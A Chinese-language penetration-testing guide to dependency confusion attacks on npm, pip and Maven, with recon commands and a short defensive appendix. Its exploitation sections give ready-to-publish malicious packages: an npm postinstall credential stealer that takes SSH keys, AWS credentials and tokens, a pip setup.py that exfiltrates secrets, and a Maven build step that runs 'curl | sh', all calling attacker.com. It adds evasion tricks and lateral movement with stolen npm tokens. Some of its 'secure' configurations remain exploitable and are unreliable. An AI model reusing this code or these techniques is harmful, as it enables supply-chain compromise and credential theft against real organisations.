# 依赖混淆攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的
- 为渗透测试人员提供依赖混淆（Dependency Confusion）攻击的系统化方法
- 指导测试人员识别和利用包管理器优先级配置缺陷
- 帮助理解公共仓库与私有仓库之间的依赖解析风险

## 1.2 适用范围
- 适用于同时使用公共和私有包管理器的组织
- 适用于使用 npm、pip、Maven、NuGet、Gem 等包管理器的项目
- 适用于存在内部包名与公共包名冲突的场景
- 适用于 CI/CD 自动拉取依赖的构建环境

## 1.3 读者对象
- 渗透测试工程师
- 安全研究人员
- DevSecOps 工程师
- 包管理器管理员

---

# 第二部分：核心渗透技术专题

## 专题一：依赖混淆攻击

### 2.1 技术介绍

依赖混淆攻击（Dependency Confusion），也称为包名抢注攻击，是指攻击者通过向公共包仓库发布与组织内部包同名的恶意包，利用包管理器的依赖解析优先级缺陷，使构建系统错误地从公共仓库拉取恶意包而非内部私有包。

**攻击本质：**
- 包管理器默认优先从公共源拉取包
- 内部包名未进行保留或保护
- 缺乏包来源验证机制
- 构建配置未明确指定包源优先级

**攻击原理流程：**

```
┌─────────────────────────────────────────────────────────────┐
│                  依赖混淆攻击流程                            │
├─────────────────────────────────────────────────────────────┤
│  1. 攻击者发现目标组织内部包名                                │
│     - 通过错误消息、文档、泄露的 package.json                │
│     - 通过 npm/yarn install 错误日志                         │
│     - 通过源码仓库扫描                                        │
├─────────────────────────────────────────────────────────────┤
│  2. 在公共仓库注册同名包                                      │
│     - npm publish、pip upload、gem push                      │
│     - 使用更高版本号（如 99.99.99）                          │
│     - 包含恶意代码（凭证窃取、后门等）                       │
├─────────────────────────────────────────────────────────────┤
│  3. 目标构建系统拉取依赖                                      │
│     - 包管理器未配置私有源优先                               │
│     - 或配置存在缺陷可被绕过                                 │
├─────────────────────────────────────────────────────────────┤
│  4. 恶意包被安装并执行                                        │
│     - postinstall 脚本执行                                   │
│     - 窃取 CI/CD 凭证                                        │
│     - 植入后门或污染构建产物                                 │
└─────────────────────────────────────────────────────────────┘
```

**CWE 映射：**

| CWE 编号 | 描述 |
|---------|------|
| CWE-1357 | Reliance on Insufficiently Trustworthy Component（依赖不够可信的组件） |
| CWE-1395 | Dependency on Vulnerable Third-Party Component（依赖脆弱的第三方组件） |
| CWE-494 | Download of Code Without Integrity Check（下载代码无完整性检查） |
| CWE-829 | Inclusion of Functionality from Untrusted Control Sphere（从不可信控制域包含功能） |

**著名案例：**

| 案例 | 时间 | 影响 |
|-----|------|------|
| Alex Birsan 研究 | 2021 年 | 发现多家科技公司（Apple、Microsoft 等）受影响 |
| CISA 警告 AA22-075A | 2022 年 | 发布依赖混淆攻击警报 |
| npm 响应 | 2021 年 | 实施包名预留和范围包支持 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 企业内部包 | @company/internal-utils | 包名未在公共仓库预留 |
| CI/CD 构建 | Jenkins/GitHub Actions 自动构建 | 未配置私有源优先 |
| 微服务架构 | 服务间共享内部库 | 依赖解析配置复杂易错 |
| 开源项目贡献 | 外部贡献者提交依赖变更 | 可能故意引入混淆包 |
| 多仓库项目 | monorepo 结构 | 依赖配置分散难管理 |
| 第三方构建服务 | 使用外部 CI/CD 服务 | 构建环境配置不可控 |

**高风险特征：**
- 使用简单包名（无 scope 前缀）
- 包管理器配置未指定源优先级
- 内部包名可在公共仓库注册
- 构建日志暴露内部包名
- 错误消息显示包查找路径

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：收集内部包名**

```bash
# 方法 1：扫描错误消息
# 触发依赖安装错误，观察错误日志
npm install 2>&1 | grep -E "ERR!|not found"

# 方法 2：检查公开文档
curl https://target.com/docs/development
curl https://target.com/api-docs

# 方法 3：扫描源码仓库
curl https://github.com/target-org/target-repo/package.json
curl https://github.com/target-org/target-repo/requirements.txt

# 方法 4：检查构建日志
# 某些 CI/CD 系统日志公开
curl https://ci.target.com/builds/123/log
```

**步骤二：检查包名可用性**

```bash
# npm 检查
npm view @target/internal-utils 2>&1 | grep -q "npm ERR" && echo "包名可用"

# pip 检查
pip search internal-utils  # pip search 已废弃，使用 PyPI API
curl https://pypi.org/pypi/internal-utils/json | grep -q "404" && echo "包名可用"

# Maven 检查
curl https://repo1.maven.org/maven2/com/target/internal-utils/maven-metadata.xml | grep -q "404" && echo "包名可用"

# 批量检查脚本
for pkg in internal-utils company-lib target-core; do
  npm view $pkg 2>&1 | grep -q "npm ERR" && echo "$pkg 可注册"
done
```

**步骤三：分析包管理器配置**

```bash
# 检查.npmrc 配置
curl https://target.com/.npmrc

# 检查 pip 配置
curl https://target.com/pip.conf

# 检查 Maven settings.xml
curl https://target.com/.m2/settings.xml

# 分析源优先级配置
# 如果公共源在前或无优先级配置，则存在风险
```

#### 2.3.2 白盒测试

**步骤一：审计包管理器配置**

```bash
# npm 配置审计
cat .npmrc
# 检查项：
# - registry 配置
# - @scope:registry 配置
# - always-auth 配置

# 风险配置示例（公共源优先）
registry=https://registry.npmjs.org/
# 缺少 @company:registry=https://private-registry.com/

# 安全配置示例（私有源优先）
@company:registry=https://private-registry.com/
registry=https://registry.npmjs.org/
```

```bash
# pip 配置审计
cat pip.conf
# 检查项：
# - [global] index-url
# - [global] extra-index-url
# - --trusted-host 配置

# 风险配置示例
[global]
index-url = https://pypi.org/simple/
# 缺少--extra-index-url 指向私有源

# 安全配置示例
[global]
index-url = https://private-pypi.com/simple/
extra-index-url = https://pypi.org/simple/
```

```bash
# Maven 配置审计
cat settings.xml
# 检查项：
# - mirrors 配置
# - servers 配置
# - profiles 激活顺序

# 风险配置示例
<mirrors>
  <mirror>
    <id>central</id>
    <url>https://repo1.maven.org/maven2</url>
    <mirrorOf>*</mirrorOf>  <!-- 所有包都从公共源 -->
  </mirror>
</mirrors>
```

**步骤二：检查依赖解析顺序**

```bash
# npm 依赖解析调试
npm install --verbose 2>&1 | grep -E "fetch|resolve"

# 查看包实际来源
npm ls --all --json | jq '.dependencies | .. | .from? // empty'

# pip 依赖来源检查
pip install -v package-name 2>&1 | grep -E "Found link|Downloading"

# Maven 依赖树和来源
mvn dependency:tree -Dverbose
mvn dependency:sources
```

**步骤三：代码审计**

```bash
# 搜索硬编码的包源
grep -r "registry.npmjs.org" .
grep -r "pypi.org" .
grep -r "repo1.maven.org" .

# 搜索内部包引用
grep -r "@company/" .
grep -r "company-" .

# 检查构建脚本
cat build.sh
cat Jenkinsfile
cat .github/workflows/*.yml
```

### 2.4 漏洞利用方法

#### 2.4.1 npm 依赖混淆攻击

**步骤 1：准备恶意包**

```json
// package.json
{
  "name": "internal-utils",
  "version": "99.99.99",
  "description": "Internal utilities library",
  "main": "index.js",
  "scripts": {
    "postinstall": "node .hooks/init.js"
  },
  "keywords": ["utils", "internal"],
  "author": "Attacker",
  "license": "MIT"
}
```

```javascript
// .hooks/init.js - 恶意脚本
const https = require('https');
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');

// 收集环境信息
const envInfo = {
  hostname: os.hostname(),
  platform: os.platform(),
  cwd: process.cwd(),
  env: Object.keys(process.env).reduce((acc, key) => {
    if (key.includes('TOKEN') || key.includes('KEY') || key.includes('SECRET')) {
      acc[key] = process.env[key];
    }
    return acc;
  }, {})
};

// 窃取凭证
const filesToSteal = [
  os.homedir() + '/.npmrc',
  os.homedir() + '/.ssh/id_rsa',
  os.homedir() + '/.aws/credentials',
  os.homedir() + '/.git-credentials',
  process.cwd() + '/.env'
];

let stolenData = {};
filesToSteal.forEach(file => {
  try {
    stolenData[file] = fs.readFileSync(file, 'utf8');
  } catch(e) {}
});

// 外带数据
const payload = Buffer.from(JSON.stringify({
  info: envInfo,
  files: stolenData
})).toString('base64');

https.get(`https://attacker.com/exfil?data=${payload}`);

// 建立持久化
exec('curl https://attacker.com/backdoor.sh | sh');
```

**步骤 2：发布到公共仓库**

```bash
# 登录 npm
npm login

# 发布恶意包
npm publish

# 验证发布成功
npm view internal-utils
```

**步骤 3：等待目标安装**

```bash
# 监控下载量
npm view internal-utils downloads

# 监控目标 CI/CD
# 如果目标有公开构建日志，观察是否触发
```

#### 2.4.2 pip 依赖混淆攻击

```python
# setup.py
from setuptools import setup
import os
import platform
import urllib.request
import json

# 收集信息
info = {
    'hostname': platform.node(),
    'platform': platform.system(),
    'python_version': platform.python_version(),
    'env': {k: v for k, v in os.environ.items() 
            if any(x in k for x in ['KEY', 'SECRET', 'TOKEN', 'PASSWORD'])}
}

# 外带数据
try:
    urllib.request.urlopen(
        f"https://attacker.com/exfil?data={urllib.parse.quote(json.dumps(info))}"
    )
except:
    pass

setup(
    name='internal-utils',
    version='99.99.99',
    py_modules=['internal_utils'],
)
```

```bash
# 发布到 PyPI
python setup.py sdist bdist_wheel
twine upload dist/*
```

#### 2.4.3 Maven 依赖混淆攻击

```xml
<!-- pom.xml -->
<project>
    <groupId>com.target</groupId>
    <artifactId>internal-utils</artifactId>
    <version>99.99.99</version>
    
    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-antrun-plugin</artifactId>
                <executions>
                    <execution>
                        <phase>compile</phase>
                        <configuration>
                            <target>
                                <!-- 恶意代码在 compile 阶段执行 -->
                                <exec executable="bash">
                                    <arg value="-c"/>
                                    <arg value="curl https://attacker.com/backdoor.sh | sh"/>
                                </exec>
                            </target>
                        </configuration>
                        <goals>
                            <goal>run</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>
</project>
```

```bash
# 发布到 Maven Central
# 需要通过 Sonatype 审核
mvn deploy
```

#### 2.4.4 凭证窃取与横向移动

```javascript
// 窃取 npm 凭证后发布恶意包
const { execSync } = require('child_process');

// 使用窃取的凭证发布
execSync('npm config set //registry.npmjs.org/:_authToken ' + stolenToken);
execSync('npm publish --access public');

// 污染目标的其他项目
// 使用窃取的凭证访问私有仓库
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过源优先级配置

```bash
# 方法 1：利用配置缺陷
# 如果配置为：
# @company:registry=https://private.com/
# registry=https://registry.npmjs.org/

# 但包名没有@company scope
# 则仍会从公共源拉取

# 方法 2：利用镜像配置
# 某些私有仓库配置为公共源镜像
# 可以发布到公共源，通过镜像同步
```

#### 2.5.2 绕过锁定文件

```bash
# 如果目标使用 package-lock.json
# 但锁文件未提交或可被修改

# 方法 1：删除锁文件
# 通过 PR 或其他方式删除 lock 文件

# 方法 2：修改锁文件
# 将内部包版本修改为公共包版本

# 方法 3：利用 npm update
# npm update 会更新到最新兼容版本
```

#### 2.5.3 绕过包名保护

```bash
# npm 实施了包名预留（squatting protection）
# 但可以绕过：

# 方法 1：使用相似名称
# internal-utils → internalutils、internal_utils

# 方法 2：利用 scope 包
# 如果目标使用@company/internal-utils
# 可以发布@company-internal/utils

# 方法 3：利用组织更名
# 如果目标组织更名，旧名称可能未保护
```

#### 2.5.4 检测规避

```javascript
// 延迟执行
setTimeout(() => {
  executePayload();
}, 300000);  // 5 分钟后

// 条件触发
if (process.env.CI === 'true' && process.env.BUILD_NUMBER) {
  // 仅在 CI/CD 环境执行
  stealCredentials();
}

// 代码混淆
const _0x1a2b = require('child_process');
_0x1a2b['exec']('malicious command');
```

---

# 第三部分：附录

## 3.1 依赖混淆检测检查表

| 检查项 | 检测方法 | 风险等级 |
|-------|---------|---------|
| 内部包名暴露 | 扫描错误日志、文档 | 高 |
| 包源配置缺陷 | 审计.npmrc/pip.conf | 高 |
| 公共源可注册 | 检查包名可用性 | 高 |
| 锁定文件缺失 | 检查 lock 文件 | 中 |
| 构建日志公开 | 检查 CI/CD 日志可见性 | 中 |

## 3.2 安全配置示例

**npm 安全配置 (.npmrc)：**
```bash
# 私有源优先
@company:registry=https://private-registry.company.com/
registry=https://registry.npmjs.org/

# 禁用公共源（仅使用私有源）
# registry=https://private-registry.company.com/

# 启用严格 SSL
strict-ssl=true

# 保存凭证
always-auth=true
```

**pip 安全配置 (pip.conf)：**
```ini
[global]
# 私有源优先
index-url = https://private-pypi.company.com/simple/
extra-index-url = https://pypi.org/simple/

# 信任私有源
trusted-host = private-pypi.company.com
```

**Maven 安全配置 (settings.xml)：**
```xml
<mirrors>
  <mirror>
    <id>private</id>
    <url>https://nexus.company.com/repository/maven-group/</url>
    <mirrorOf>*,!central</mirrorOf>
  </mirror>
</mirrors>
```

## 3.3 检测工具

| 工具名称 | 用途 | 链接 |
|---------|------|------|
| depcheck | 依赖检查 | https://github.com/depcheck/depcheck |
| npm-audit | npm 安全审计 | npm 内置 |
| pip-audit | pip 安全审计 | https://pypi.org/project/pip-audit/ |
| Socket.dev | npm 包分析 | https://socket.dev/ |

## 3.4 防御建议

| 措施 | 描述 |
|-----|------|
| 包名预留 | 在公共仓库预留内部包名 |
| 使用 Scope 包 | 使用@org/package 格式 |
| 源优先级 | 配置私有源优先于公共源 |
| 锁定文件 | 提交并保护 lock 文件 |
| 包签名 | 启用包签名验证 |
| 私有仓库 | 内部包仅发布到私有仓库 |
| 监控告警 | 监控公共仓库的相似包名 |

---

## 参考资源

- [Alex Birsan - Dependency Confusion](https://blog.birsan.com/dependency-confusion/)
- [CISA Alert AA22-075A](https://www.cisa.gov/news-events/alerts/2022/03/16/dependency-confusion-attacks)
- [npm Package Squatting Protection](https://docs.npmjs.com/policies/squatting)
- [OWASP Software Supply Chain Security](https://owasp.org/www-project-software-supply-chain-security/)
